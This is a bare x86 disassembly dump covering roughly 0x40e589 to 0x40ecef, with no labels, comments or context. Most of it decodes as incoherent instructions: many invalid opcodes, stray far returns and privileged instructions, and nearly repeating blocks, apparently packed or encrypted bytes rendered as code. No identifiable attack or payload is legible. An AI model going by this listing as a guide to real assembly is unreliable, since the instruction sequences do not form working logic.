  40e589:	mov    ecx,DWORD PTR [ebp-0x28]
  40e58c:	mov    ecx,ebx
  40e58e:	clc    
  40e58f:	jne    0x40e55c
  40e591:	mov    esi,0xd672d3
  40e596:	into   
  40e597:	into   
  40e598:	scas   eax,DWORD PTR es:[edi]
  40e599:	dec    ebp
  40e59a:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  40e5a0:	sub    ecx,esi
  40e5a2:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e5a5:	(bad)  
  40e5a6:	mov    edi,eax
  40e5a8:	mov    al,0x85
  40e5aa:	mov    eax,edi
  40e5ac:	add    BYTE PTR [ebp-0x75],al
  40e5af:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  40e5b6:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e5bc:	rdtsc  
  40e5be:	retf   0x559c
  40e5c1:	(bad)  
  40e5c2:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  40e5c9:	inc    ebp
  40e5ca:	add    eax,0xeb9c4d3f
  40e5cf:	(bad)  
  40e5d0:	mov    ecx,esp
  40e5d2:	lods   al,BYTE PTR ds:[esi]
  40e5d3:	test   DWORD PTR [ebp-0x8],edx
  40e5d6:	xor    ecx,DWORD PTR [ebp+0x33]
  40e5d9:	mov    eax,DWORD PTR [ebx]
  40e5db:	lock add ecx,ebx
  40e5de:	bswap  esi
  40e5e0:	retf   0x55d1
  40e5e3:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  40e5e9:	jmp    0x40e5e4
  40e5eb:	add    BYTE PTR ds:0xebc44d8b,al
  40e5f1:	push   ebp
  40e5f2:	mov    ebp,DWORD PTR [ebx]
  40e5f4:	test   al,0x8b
  40e5f6:	push   ebp
  40e5f7:	clc    
  40e5f8:	xor    ecx,ebx
  40e5fa:	xor    ecx,esi
  40e5fc:	add    edx,ecx
  40e5fe:	add    eax,DWORD PTR [edx+0xca010f]
  40e604:	push   ebp
  40e605:	dec    ebp
  40e606:	mov    ecx,DWORD PTR [ebx-0x34050710]
  40e60c:	stc    
  40e60d:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e613:	scas   eax,DWORD PTR es:[edi]
  40e614:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  40e61a:	xor    ebp,DWORD PTR [ebx]
  40e61c:	xor    edi,DWORD PTR [ebx]
  40e61e:	add    esi,DWORD PTR [edi+0x3]
  40e621:	mov    ecx,DWORD PTR [edi]
  40e623:	clc    
  40e624:	retf   0x55cb
  40e627:	into   
  40e628:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  40e62f:	mov    eax,0x3376554d
  40e634:	mov    esi,DWORD PTR [ebx]
  40e636:	int3   
  40e637:	add    edx,DWORD PTR [ebp+0x3]
  40e63a:	xor    ecx,DWORD PTR [edi]
  40e63c:	xor    ecx,edx
  40e63e:	add    edx,DWORD PTR [ebp+0x3]
  40e641:	mov    ecx,DWORD PTR [edi]
  40e643:	lock retf 0x4dfa
  40e647:	stc    
  40e648:	mov    ecx,DWORD PTR [eax]
  40e64a:	or     BYTE PTR [ebp+0x4d],cl
  40e64d:	jmp    0x104e6dd
  40e652:	dec    ebp
  40e653:	dec    ebp
  40e654:	(bad)  
  40e655:	mov    ebx,esp
  40e657:	clc    
  40e658:	test   ebx,ecx
  40e65a:	clc    
  40e65b:	ror    DWORD PTR [ebp-0x2a],cl
  40e65e:	mov    esi,ecx
  40e660:	call   0x33cc2c14
  40e665:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  40e66c:	retf   
  40e66d:	ja     0x40e63d
  40e66f:	mov    ebp,DWORD PTR [eax-0x48]
  40e672:	dec    ebp
  40e673:	xor    ecx,DWORD PTR [di+0x3]
  40e677:	mov    esp,esp
  40e679:	clc    
  40e67a:	push   ebp
  40e67b:	retf   
  40e67c:	mov    dl,bl
  40e67e:	adc    esi,edx
  40e680:	jb     0x40e650
  40e682:	add    BYTE PTR [edi-0x3b7474b3],ch
  40e688:	call   0x4d6cb20a
  40e68d:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  40e693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e694:	popf   
  40e695:	inc    ebp
  40e696:	xor    cl,BYTE PTR [ebp-0x78]
  40e699:	mov    edx,edi
  40e69b:	clc    
  40e69c:	dec    ebp
  40e69d:	retf   
  40e69e:	mov    edx,ebx
  40e6a0:	call   0x560fba7b
  40e6a5:	scas   eax,DWORD PTR es:[edi]
  40e6a6:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  40e6ac:	popf   
  40e6ad:	sub    esi,DWORD PTR [edx]
  40e6af:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e6b5:	lods   al,BYTE PTR ds:[esi]
  40e6b6:	xor    esp,DWORD PTR [ebx]
  40e6b8:	add    ecx,DWORD PTR [ebp-0x1c]
  40e6bb:	mov    edi,DWORD PTR [ebp-0x8]
  40e6be:	mov    bl,cl
  40e6c0:	cmp    dl,bl
  40e6c2:	jb     0x40e692
  40e6c4:	add    dh,dl
  40e6c6:	dec    ebp
  40e6c7:	scas   eax,DWORD PTR es:[edi]
  40e6c8:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e6ce:	shr    DWORD PTR [ebx],cl
  40e6d0:	into   
  40e6d1:	cmp    edx,esi
  40e6d3:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e6d9:	dec    ebp
  40e6da:	dec    ebp
  40e6db:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e6e1:	retf   
  40e6e2:	xor    edx,esi
  40e6e4:	add    ecx,esi
  40e6e6:	imul   ecx,edx
  40e6e9:	mov    DWORD PTR [ebp+0x8],edx
  40e6ec:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e6ef:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e6f5:	add    esi,DWORD PTR [ebx]
  40e6f7:	mov    ah,0x3
  40e6f9:	inc    ebp
  40e6fa:	sysexit 
  40e6fc:	xlat   BYTE PTR ds:[ebx]
  40e6fd:	pushf  
  40e6fe:	jge    0x40e689
  40e700:	xor    ebx,eax
  40e702:	sub    eax,DWORD PTR [ebp-0x73]
  40e705:	(bad)  
  40e706:	cmp    al,al
  40e708:	jb     0x40e68f
  40e70a:	add    al,bh
  40e70c:	ror    DWORD PTR [ebp-0x7a],1
  40e70f:	xor    edi,edi
  40e711:	add    edi,edi
  40e713:	jmp    0x40e762
  40e715:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e71b:	dec    ebp
  40e71c:	into   
  40e71d:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e723:	popf   
  40e724:	shl    DWORD PTR [edx],cl
  40e726:	retf   0x5588
  40e729:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e72f:	add    eax,DWORD PTR [eax]
  40e731:	in     al,0x4d
  40e733:	push   ebp
  40e734:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e73a:	arpl   WORD PTR [eax],ax
  40e73c:	int    0x4d
  40e73e:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e744:	dec    ebp
  40e745:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e74b:	jge    0x40e71b
  40e74d:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e753:	add    cl,dh
  40e755:	dec    ebp
  40e756:	dec    DWORD PTR [ebx-0x2c032375]
  40e75c:	adc    BYTE PTR [ebp+0x1],0x8b
  40e760:	add    al,bl
  40e762:	jge    0x40e6f0
  40e764:	push   0xffffff9d
  40e766:	push   0x8b3032
  40e76b:	shl    BYTE PTR [ebp+0x55],0x6a
  40e76f:	xor    edi,edi
  40e771:	xor    edx,DWORD PTR [ebx+eax*1]
  40e774:	inc    ebp
  40e775:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e77b:	dec    ebp
  40e77c:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e782:	jbe    0x40e70f
  40e784:	mov    ebp,esp
  40e786:	ror    bl,1
  40e788:	enter  0x14ce,0xaf
  40e78c:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e792:	push   ebp
  40e793:	retf   0x5540
  40e796:	push   ebp
  40e797:	mov    esi,DWORD PTR [edx-0x1c]
  40e79a:	mov    edx,ebx
  40e79c:	cld    
  40e79d:	(bad)  
  40e79e:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e7a5:	sti    
  40e7a6:	add    dh,cl
  40e7a8:	push   0xffffff94
  40e7aa:	call   FWORD PTR [ebp+0x3b5032d0]
  40e7b0:	mov    ecx,DWORD PTR [edi]
  40e7b2:	int3   
  40e7b3:	pop    esi
  40e7b4:	inc    ebp
  40e7b5:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e7bb:	push   ebp
  40e7bc:	xor    esi,DWORD PTR [ebx]
  40e7be:	mov    DWORD PTR [ebx],0xcace0f9c
  40e7c4:	aas    
  40e7c5:	push   ebp
  40e7c6:	inc    ebp
  40e7c7:	xor    eax,esi
  40e7c9:	add    eax,esi
  40e7cb:	mov    eax,DWORD PTR [ebx]
  40e7cd:	(bad)  
  40e7ce:	jmp    0x40e75c
  40e7d0:	mov    bl,BYTE PTR [ebp-0x7674cdfb]
  40e7d6:	rol    ah,1
  40e7d8:	mov    esi,0xf133104d
  40e7dd:	mov    edx,0xff368d80
  40e7e2:	mov    dh,0xd1
  40e7e4:	cmp    edx,DWORD PTR [ebp+0xf]
  40e7e7:	mov    eax,DWORD PTR [edx-0x20]
  40e7ea:	add    BYTE PTR [ebp-0x75],bh
  40e7ed:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e7f4:	popf   
  40e7f5:	retf   0x8632
  40e7f8:	cmp    ebp,0x8
  40e7fb:	call   ebx
  40e7fd:	inc    ebp
  40e7fe:	inc    ebp
  40e7ff:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e805:	mov    esi,DWORD PTR ds:0xc7049cc8
  40e80b:	add    al,al
  40e80d:	add    bl,al
  40e80f:	(bad)  
  40e810:	clc    
  40e811:	enter  0x45,0x35
  40e815:	push   eax
  40e816:	pushf  
  40e817:	mov    edi,eax
  40e819:	int3   
  40e81a:	or     al,al
  40e81c:	test   DWORD PTR [edi],edi
  40e81e:	clc    
  40e81f:	gs inc ebp
  40e821:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e827:	push   ss
  40e828:	xor    ecx,DWORD PTR [ebp+0x3]
  40e82b:	sub    edx,DWORD PTR [ecx-0x76]
  40e82e:	dec    ebp
  40e82f:	add    DWORD PTR [ebx+0x88d845],ecx
  40e835:	mov    esi,DWORD PTR [ebx]
  40e837:	or     BYTE PTR [ebx],al
  40e839:	cmp    edx,DWORD PTR [ecx-0x38]
  40e83c:	dec    ebp
  40e83d:	out    dx,eax
  40e83e:	xor    eax,DWORD PTR [ebp+0x3]
  40e841:	mov    edx,DWORD PTR [ecx-0x28]
  40e844:	dec    ebp
  40e845:	add    BYTE PTR [ebx],dh
  40e847:	push   0x518003
  40e84c:	push   eax
  40e84d:	add    BYTE PTR [ebx-0x300748b],cl
  40e853:	sbb    BYTE PTR [ebp+0x45],cl
  40e856:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e85c:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e862:	dec    ebp
  40e863:	inc    ebp
  40e864:	xor    eax,esi
  40e866:	add    eax,esi
  40e868:	push   ecx
  40e869:	(bad)  
  40e86a:	dec    ebp
  40e86b:	mov    al,ds:0xc9e031ff
  40e870:	retf   
  40e871:	(bad)  
  40e872:	into   
  40e873:	sub    bh,bh
  40e875:	dec    esp
  40e876:	adc    al,0x9c
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	test   DWORD PTR [edi],ecx
  40e87c:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab7ff80]
  40e883:	jmp    0xc9b9f797
  40e888:	add    cl,dl
  40e88a:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e894:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e89a:	rol    BYTE PTR [eax],0x56
  40e89d:	clc    
  40e89e:	arpl   WORD PTR [edx+0x7],si
  40e8a1:	mov    eax,DWORD PTR [ebp-0x30]
  40e8a4:	xor    al,0x40
  40e8a6:	sub    al,0xc7
  40e8a8:	mov    ah,ch
  40e8aa:	add    DWORD PTR [ebp+0x4534f845],eax
  40e8b0:	sub    al,0x84
  40e8b2:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e8b9:	mov    ch,0xff
  40e8bb:	clc    
  40e8bc:	add    DWORD PTR [ebp+0x60],0x31
  40e8c0:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e8c7:	inc    ebp
  40e8c8:	dec    DWORD PTR [ebx-0x341ff701]
  40e8ce:	test   esi,ecx
  40e8d0:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e8d6:	push   eax
  40e8d7:	add    DWORD PTR [ebp+0x0],eax
  40e8da:	dec    ebx
  40e8dc:	or     al,0xce
  40e8de:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e8e5:	into   
  40e8e6:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e8ec:	mov    esi,ecx
  40e8ee:	sar    bh,0x45
  40e8f1:	adc    al,0x8b
  40e8f3:	clc    
  40e8f4:	fadd   DWORD PTR [ebp+0x0]
  40e8f7:	mov    ebp,DWORD PTR [edx+0x8]
  40e8fa:	push   edi
  40e8fb:	adc    BYTE PTR [eax+0x1],0x83
  40e8ff:	add    al,al
  40e901:	retf   
  40e902:	mov    ecx,esi
  40e904:	cld    
  40e905:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e90b:	into   
  40e90c:	add    BYTE PTR [ebx+0x756aec00],cl
  40e912:	jne    0x40e947
  40e914:	inc    DWORD PTR [ebx]
  40e916:	rcl    BYTE PTR [ecx+0x50],1
  40e919:	push   eax
  40e91a:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e920:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e927:	sar    bh,0x84
  40e92a:	or     BYTE PTR [ebx],al
  40e92c:	push   eax
  40e92d:	add    BYTE PTR [ebx+0x4530c845],cl
  40e933:	pushf  
  40e934:	xor    eax,0x89b49cc7
  40e939:	test   eax,ebp
  40e93b:	clc    
  40e93c:	inc    ebp
  40e93d:	inc    ebp
  40e93e:	mov    DWORD PTR [eax+eax*8],esi
  40e941:	sub    al,0x32
  40e943:	mov    BYTE PTR [ebx+ecx*4+0x56d8ec89],bl
  40e94a:	dec    ebp
  40e94b:	arpl   WORD PTR [ebx],si
  40e94d:	inc    edi
  40e94e:	add    ecx,DWORD PTR [ebx+0x56f4b489]
  40e954:	dec    ebp
  40e955:	arpl   WORD PTR [ebx],si
  40e957:	inc    edi
  40e958:	add    eax,DWORD PTR [ebx-0xf7a377]
  40e95e:	inc    ebp
  40e95f:	add    ch,dl
  40e961:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e962:	pushf  
  40e963:	inc    edi
  40e965:	dec    esp
  40e967:	lea    eax,[ebp+0x45fff860]
  40e96d:	push   eax
  40e96e:	xor    BYTE PTR [ebp-0x64],dh
  40e971:	(bad)  
  40e972:	(bad)  
  40e973:	pop    esp
  40e974:	lods   al,BYTE PTR ds:[esi]
  40e975:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e97b:	mov    edi,DWORD PTR [esi]
  40e97d:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e984:	test   DWORD PTR [edi-0x8],edx
  40e987:	inc    esi
  40e988:	inc    ebp
  40e989:	add    BYTE PTR [eax+ebp*2],bh
  40e98c:	pushf  
  40e98d:	or     BYTE PTR [ebx+0x5545ec00],0x8b
  40e994:	xor    edi,esp
  40e996:	add    eax,DWORD PTR [eax+0xf013b]
  40e99c:	adc    al,0x0
  40e99e:	add    bh,bh
  40e9a0:	jmp    0xbdeabd
  40e9a5:	add    BYTE PTR [ebp+0x45],cl
  40e9a8:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e9ae:	dec    ebp
  40e9af:	push   0x38033
  40e9b4:	cmp    eax,DWORD PTR [eax]
  40e9b6:	unpcklps xmm7,xmm0
  40e9b9:	jne    0x40e9bb
  40e9bb:	dec    DWORD PTR [ebx+0x5545cc18]
  40e9c1:	mov    DWORD PTR [ebx],esi
  40e9c3:	shl    BYTE PTR [ebx],1
  40e9c5:	inc    ebp
  40e9c6:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e9cc:	retf   0x5575
  40e9cf:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e9d5:	(bad)  
  40e9d6:	stc    
  40e9d7:	in     al,dx
  40e9d8:	or     al,0x85
  40e9da:	dec    ebp
  40e9db:	clc    
  40e9dc:	xor    eax,DWORD PTR [ebp+0x3]
  40e9df:	mov    ebp,ecx
  40e9e1:	rol    BYTE PTR [eax],1
  40e9e3:	inc    ebp
  40e9e4:	add    BYTE PTR [eax-0x7747ab3],bh
  40e9ea:	clc    
  40e9eb:	inc    ebp
  40e9ec:	retf   
  40e9ed:	mov    edx,ebx
  40e9ef:	in     al,dx
  40e9f0:	(bad)  
  40e9f1:	retf   
  40e9f2:	into   
  40e9f3:	into   
  40e9f4:	scas   eax,DWORD PTR es:[edi]
  40e9f5:	dec    ebp
  40e9f6:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e9fc:	sub    ecx,esi
  40e9fe:	cmp    ecx,DWORD PTR [ebp+0x77]
  40ea01:	(bad)  
  40ea02:	mov    edi,eax
  40ea04:	int3   
  40ea05:	test   DWORD PTR [ecx-0x74baff08],ecx
  40ea0b:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40ea12:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40ea18:	rdtsc  
  40ea1a:	retf   0x559c
  40ea1d:	(bad)  
  40ea1e:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40ea25:	inc    ebp
  40ea26:	add    eax,0xeb9c4d3f
  40ea2b:	(bad)  
  40ea2c:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40ea32:	xor    ecx,DWORD PTR [ebp+0x33]
  40ea35:	mov    eax,DWORD PTR [ebx]
  40ea37:	call   0xce50b53f
  40ea3c:	retf   0x55d1
  40ea3f:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40ea45:	jmp    0x40ea40
  40ea47:	add    BYTE PTR ds:0xebf44d8b,al
  40ea4d:	push   ebp
  40ea4e:	mov    ebp,DWORD PTR [ebx]
  40ea50:	mov    eax,0x33f8558b
  40ea55:	retf   
  40ea56:	xor    ecx,esi
  40ea58:	add    edx,ecx
  40ea5a:	add    eax,DWORD PTR [edx+0xca010f]
  40ea60:	push   ebp
  40ea61:	dec    ebp
  40ea62:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40ea68:	stc    
  40ea69:	rol    DWORD PTR ds:0xebce4dd6,cl
  40ea6f:	scas   eax,DWORD PTR es:[edi]
  40ea70:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40ea76:	xor    ebp,DWORD PTR [ebx]
  40ea78:	xor    edi,DWORD PTR [ebx]
  40ea7a:	add    esi,DWORD PTR [edi+0x3]
  40ea7d:	mov    ecx,DWORD PTR [edi]
  40ea7f:	clc    
  40ea80:	retf   0x55cb
  40ea83:	into   
  40ea84:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40ea8b:	test   al,0x4d
  40ea8d:	push   ebp
  40ea8e:	jbe    0x40eac3
  40ea90:	mov    esi,DWORD PTR [ebx]
  40ea92:	mov    al,0x3
  40ea94:	push   ebp
  40ea95:	add    esi,DWORD PTR [ebx]
  40ea97:	rdpmc  
  40ea99:	retf   0x5503
  40ea9c:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40eaa2:	dec    ebp
  40eaa3:	stc    
  40eaa4:	mov    ecx,DWORD PTR [eax]
  40eaa6:	or     BYTE PTR [ebp+0x4d],cl
  40eaa9:	jmp    0x134eb39
  40eaae:	dec    ebp
  40eaaf:	dec    ebp
  40eab0:	(bad)  
  40eab1:	mov    ebx,esp
  40eab3:	clc    
  40eab4:	test   ebx,ecx
  40eab6:	clc    
  40eab7:	ror    DWORD PTR [ebp-0x2a],cl
  40eaba:	mov    esi,ecx
  40eabc:	lock scas eax,DWORD PTR es:[edi]
  40eabe:	inc    ebp
  40eabf:	mov    esi,DWORD PTR [ebx]
  40eac1:	hlt    
  40eac2:	pushf  
  40eac3:	jge    0x40ea50
  40eac5:	sub    ebx,esp
  40eac7:	cmp    ecx,ebx
  40eac9:	ja     0x40ea99
  40eacb:	mov    ebp,DWORD PTR [eax-0x58]
  40eace:	dec    ebp
  40eacf:	xor    ecx,DWORD PTR [di+0x3]
  40ead3:	mov    esp,esp
  40ead5:	clc    
  40ead6:	push   ebp
  40ead7:	retf   
  40ead8:	mov    dl,bl
  40eada:	adc    esi,edx
  40eadc:	jb     0x40eaac
  40eade:	add    BYTE PTR [edi-0xb7474b3],ch
  40eae4:	lock jge 0x40eab2
  40eae7:	sub    ecx,DWORD PTR [ebp+0x3b]
  40eaea:	mov    esi,DWORD PTR [edi-0x20]
  40eaed:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459d]
  40eaf4:	mov    BYTE PTR [ebx-0x34b20729],cl
  40eafa:	mov    edx,ebx
  40eafc:	lock (bad) 
  40eafe:	ror    esi,cl
  40eb00:	push   ebp
  40eb01:	scas   eax,DWORD PTR es:[edi]
  40eb02:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40eb08:	popf   
  40eb09:	sub    esi,DWORD PTR [edx]
  40eb0b:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40eb11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb12:	xor    esp,DWORD PTR [ebx]
  40eb14:	add    ecx,DWORD PTR [ebp-0x1c]
  40eb17:	mov    edi,DWORD PTR [ebp-0x8]
  40eb1a:	mov    bl,cl
  40eb1c:	cmp    dl,bl
  40eb1e:	jb     0x40eaee
  40eb20:	add    dh,dl
  40eb22:	dec    ebp
  40eb23:	scas   eax,DWORD PTR es:[edi]
  40eb24:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40eb2a:	shr    DWORD PTR [ebx],cl
  40eb2c:	into   
  40eb2d:	cmp    edx,esi
  40eb2f:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40eb35:	dec    ebp
  40eb36:	dec    ebp
  40eb37:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40eb3d:	retf   
  40eb3e:	xor    edx,esi
  40eb40:	add    ecx,esi
  40eb42:	imul   ecx,edx
  40eb45:	mov    DWORD PTR [ebp+0x8],edx
  40eb48:	xor    ecx,DWORD PTR [ebp+0x2b]
  40eb4b:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40eb51:	add    esi,DWORD PTR [ebx]
  40eb53:	rol    BYTE PTR [ebx],0x45
  40eb56:	sysexit 
  40eb58:	xlat   BYTE PTR ds:[ebx]
  40eb59:	pushf  
  40eb5a:	jge    0x40eae5
  40eb5c:	xor    esp,eax
  40eb5e:	sub    eax,DWORD PTR [ebp-0x73]
  40eb61:	(bad)  
  40eb62:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40eb69:	dec    ebp
  40eb6a:	xchg   BYTE PTR [ebx],dh
  40eb6c:	inc    DWORD PTR [ebx]
  40eb6e:	(bad)  
  40eb6f:	jmp    0x40ebbe
  40eb71:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40eb77:	dec    ebp
  40eb78:	into   
  40eb79:	mov    ebp,DWORD PTR [edi-0x23737420]
  40eb7f:	popf   
  40eb80:	shl    DWORD PTR [edx],cl
  40eb82:	retf   0x5588
  40eb85:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40eb8b:	add    eax,DWORD PTR [eax]
  40eb8d:	in     al,0x4d
  40eb8f:	push   ebp
  40eb90:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40eb96:	arpl   WORD PTR [eax],ax
  40eb98:	int    0x4d
  40eb9a:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40eba0:	dec    ebp
  40eba1:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40eba7:	jge    0x40eb77
  40eba9:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ebaf:	add    cl,dh
  40ebb1:	dec    ebp
  40ebb2:	dec    DWORD PTR [ebx-0x2c032301]
  40ebb8:	inc    ebp
  40ebb9:	push   ebp
  40ebba:	dec    DWORD PTR [ebx-0x73ff1f34]
  40ebc0:	lea    ebx,[ebp-0x7400cdac]
  40ebc6:	push   eax
  40ebc7:	mov    ah,0x45
  40ebc9:	push   ebp
  40ebca:	mov    esi,DWORD PTR [ebx]
  40ebcc:	les    esi,FWORD PTR [ebx]
  40ebce:	add    BYTE PTR [ebx],al
  40ebd0:	inc    DWORD PTR [ebx]
  40ebd2:	mov    ecx,DWORD PTR [edi]
  40ebd4:	cld    
  40ebd5:	retf   0x4d80
  40ebd8:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40ebde:	jne    0x40eb6b
  40ebe0:	(bad)  
  40ebe1:	in     al,dx
  40ebe2:	ror    bl,1
  40ebe4:	clc    
  40ebe5:	into   
  40ebe6:	add    BYTE PTR [edi-0xf2f7475],ch
  40ebec:	not    bl
  40ebee:	adc    al,0xca
  40ebf0:	inc    ebp
  40ebf1:	push   ebp
  40ebf2:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40ebf8:	push   0xaf80d6
  40ebfd:	mov    eax,DWORD PTR [eax]
  40ebff:	fdiv   st(7),st
  40ec01:	sti    
  40ec02:	sbb    dh,cl
  40ec04:	pop    esi
  40ec05:	xchg   esp,eax
  40ec06:	leave  
  40ec07:	popf   
  40ec08:	add    al,0x32
  40ec0a:	push   ebp
  40ec0b:	cmp    ebp,esp
  40ec0d:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40ec11:	dec    DWORD PTR [ecx-0x740f0375]
  40ec17:	push   ebp
  40ec18:	cld    
  40ec19:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40ec1f:	retf   0x558b
  40ec22:	clc    
  40ec23:	xor    esi,eax
  40ec25:	add    esi,DWORD PTR [ebp-0x75]
  40ec28:	(bad)  
  40ec29:	hlt    
  40ec2a:	or     cl,BYTE PTR [esi+eax*8-0x39cdf763]
  40ec31:	mov    DWORD PTR [edx],ecx
  40ec33:	hlt    
  40ec34:	(bad)  
  40ec35:	dec    ebp
  40ec36:	add    dh,BYTE PTR [ebx]
  40ec38:	leave  
  40ec39:	mov    edx,0xffec8d55
  40ec3e:	push   ecx
  40ec3f:	rol    DWORD PTR [ebp+0x55],1
  40ec42:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40ec48:	mov    eax,0xf8030b33
  40ec4d:	lar    ecx,di
  40ec50:	push   ebp
  40ec51:	retf   0x863b
  40ec54:	jne    0x40ec53
  40ec56:	mov    edi,edi
  40ec58:	or     BYTE PTR [ebp+0x41],dh
  40ec5b:	mov    esp,edx
  40ec5d:	cld    
  40ec5e:	inc    eax
  40ec5f:	mov    al,0x29
  40ec61:	add    DWORD PTR [ecx+0x0],eax
  40ec64:	loope  0x40ebeb
  40ec66:	inc    ecx
  40ec67:	call   edx
  40ec69:	inc    edx
  40ec6b:	mov    eax,DWORD PTR [eax]
  40ec6d:	cld    
  40ec6e:	mov    eax,DWORD PTR [eax+0x8d0151]
  40ec74:	clc    
  40ec75:	xor    BYTE PTR [ebp+0x45],al
  40ec78:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40ec7e:	loopne 0x40ec7f
  40ec80:	mov    edi,edi
  40ec82:	mov    ecx,eax
  40ec84:	clc    
  40ec85:	jne    0x40ec57
  40ec87:	call   0x81fd90
  40ec8c:	sub    DWORD PTR [ebp+0x45],esi
  40ec8f:	test   esi,eax
  40ec91:	je     0x40ec94
  40ec93:	mov    eax,esi
  40ec95:	cld    
  40ec96:	or     DWORD PTR [eax+0x401c9],eax
  40ec9c:	push   ebp
  40ec9d:	add    ah,ch
  40ec9f:	add    BYTE PTR [ecx+0x6a],dl
  40eca2:	inc    ebp
  40eca3:	push   esi
  40eca4:	mov    DWORD PTR [eax-0x4],edx
  40eca7:	pop    edi
  40eca8:	mov    ebx,DWORD PTR [ebx-0x4]
  40ecab:	ret    0xbc
  40ecae:	push   es
  40ecaf:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40ecb5:	clc    
  40ecb6:	lock inc ebp
  40ecb8:	jne    0x40ed10
  40ecba:	(bad)  
  40ecbb:	jne    0x40ecc1
  40ecbd:	mov    eax,0xf841ba66
  40ecc2:	rol    BYTE PTR [esi],cl
  40ecc4:	(bad)  
  40ecc5:	jne    0x40ecf8
  40ecc7:	cmp    eax,ebx
  40ecc9:	pop    esi
  40ecca:	mov    ecx,DWORD PTR [eax]
  40eccc:	push   ecx
  40eccd:	inc    ecx
  40ecce:	lea    edi,[esi-0x8]
  40ecd1:	inc    edx
  40ecd2:	inc    ebp
  40ecd3:	ror    DWORD PTR [ebx-0x408103be],0x41
  40ecda:	xchg   esp,ebp
  40ecdc:	mov    ebx,eax
  40ecde:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ece4:	or     edi,eax
  40ece6:	inc    ebp
  40ece7:	inc    ebp
  40ece8:	(bad)  
  40ece9:	mov    ecx,DWORD PTR [eax]
  40eceb:	cld    
  40ecec:	(bad)  
  40eced:	jmp    0x40ecf0
  40ecef:	mov    eax,esi
